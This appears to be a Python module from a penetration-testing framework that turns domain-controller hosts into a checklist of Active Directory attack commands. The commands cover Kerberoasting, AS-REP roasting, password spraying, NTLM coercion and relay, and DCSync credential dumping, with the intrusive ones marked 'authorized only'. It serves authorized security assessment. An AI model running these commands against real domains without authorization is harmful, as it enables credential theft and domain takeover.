#!/usr/bin/env python3
"""modules.active_directory — LDAP / Kerberos / AD assessment methodology."""
from __future__ import annotations

from .base import Module, ModuleResult, Check, host_label, worst, looks_like_dc


class ADModule(Module):
    name = "active_directory"
    title = "Active Directory"

    def assess(self, host, findings):
        if not looks_like_dc(host):
            return []
        label, ip = host_label(host), host.get("ip") or host_label(host)
        ff = [f for f in findings
              if f["category"] in ("Directory", "Vuln scan")
              or any(k in f["title"].lower() for k in ("ldap", "kerberos", "smb", "ms17-010"))]

        surface = ["Host shows domain-controller indicators (Kerberos/LDAP services or DC naming).",
                   "Domain context — credential exposure here can escalate to domain-wide access."]

        checks = [
            Check("LDAP anonymous bind", f"ldapsearch -x -H ldap://{ip} -s base namingContexts",
                  "Test anonymous bind and read the base DSE / naming contexts.", "T1087.002"),
            Check("Domain object dump", f"ldapdomaindump -u '<domain>\\<user>' -p <pass> {ip}",
                  "Dump users/groups/computers/policies over LDAP (ldapdomaindump).", "T1087.002"),
            Check("Domain user enumeration", f"kerbrute userenum -d <domain> --dc {ip} users.txt",
                  "Validate usernames via Kerberos pre-auth responses.", "T1087.002"),
            Check("Password policy", f"nxc smb {ip} -u <user> -p <pass> --pass-pol",
                  "Read lockout/complexity policy before any spraying.", "T1201"),
            Check("AS-REP roasting", f"GetNPUsers.py <domain>/ -dc-ip {ip} -usersfile users.txt -no-pass -format hashcat",
                  "Find accounts without Kerberos pre-auth (offline cracking).", "T1558.004"),
            Check("Kerberoasting", f"GetUserSPNs.py <domain>/<user>:<pass> -dc-ip {ip} -request -outputfile spn.hashes",
                  "List/request SPN tickets for offline cracking.", "T1558.003"),
            Check("AD CS templates (ESC)", f"certipy find -u <user>@<domain> -p <pass> -dc-ip {ip} -vulnerable -stdout",
                  "Find vulnerable certificate templates (ESC1-ESC16) via Certipy.", "T1649"),
            Check("Delegation enumeration", f"findDelegation.py <domain>/<user>:<pass> -dc-ip {ip}",
                  "Enumerate unconstrained/constrained/RBCD delegation.", "T1558"),
            Check("BloodHound collection", f"bloodhound-python -d <domain> -u <user> -p <pass> -dc {label} -c All",
                  "Collect AD objects/ACLs/sessions to map paths (Windows: SharpHound).", "T1482"),
            Check("SOAPHound collection (ADWS)", f"soaphound.py -u '<domain>\\<user>' -p <pass> --dc {ip} --bloodhound",
                  "Collect BloodHound data over ADWS (stealthier than LDAP).", "T1482"),
            Check("Password spraying", "# authorized only, respect lockout: nxc smb "
                  f"{ip} -u users.txt -p 'Spring2026!' --continue-on-success",
                  "Spray one password across users (lockout-aware).", "T1110.003", risk="intrusive"),
            Check("Coercion (forced auth)",
                  f"# authorized only: coercer coerce -u <user> -p <pass> -d <domain> -t {ip} -l <listener>",
                  "Coerce DC auth (PetitPotam/Coercer) toward a relay.", "T1187", risk="intrusive"),
            Check("NTLM relay to LDAP/ADCS", f"# authorized only: ntlmrelayx.py -t ldaps://{ip} --escalate-user <user>",
                  "Relay coerced auth to LDAP(S)/AD CS for escalation.", "T1557.001", risk="intrusive"),
            Check("DCSync",
                  f"# authorized only (replication rights): secretsdump.py <domain>/<user>:<pass>@{ip} -just-dc",
                  "Replicate directory secrets (krbtgt / domain hashes).", "T1003.006", risk="intrusive"),
        ]
        return [ModuleResult(
            self.name, self.title, label, "active-directory",
            "Active Directory / domain-controller methodology.", worst(ff),
            techniques=self.techs(checks, extra=("T1003.006",)),
            attack_surface=surface, checks=[c.to_dict() for c in checks], findings=ff)]
